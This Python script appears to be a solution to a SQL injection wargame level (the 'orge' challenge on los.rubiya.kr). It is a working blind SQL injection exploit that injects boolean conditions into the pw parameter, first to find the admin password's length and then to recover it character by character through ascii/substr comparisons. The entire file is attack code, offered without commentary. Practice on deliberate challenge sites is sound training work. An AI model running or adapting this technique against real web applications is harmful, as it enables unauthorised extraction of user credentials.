import requests

cookie = {'PHPSESSID' : '~~~~'}

for i in range(1,21):
    url = "https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php?\
            pw=1234' || id='admin' %%26%%26 length(pw)=%d %%23" % i
    res = requests.get(url, cookies=cookie)
    
    if "Hello admin" in res.text:
        pw_len = i
        print("Length of pw : %d" % i)
        break
        
pw_value = ""
for i in range(pw_len):
    for j in range(33,127):
        url = "https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php?\
                pw=1234' || id='admin' %%26%%26 ascii(substr(pw,%d,1))=%d %%23" % (i+1, j)
        res = requests.get(url, cookies=cookie)

        if "Hello admin" in res.text:
            pw_value += chr(j)
            print("pw(%d) : %s" % (i+1, pw_value))
            break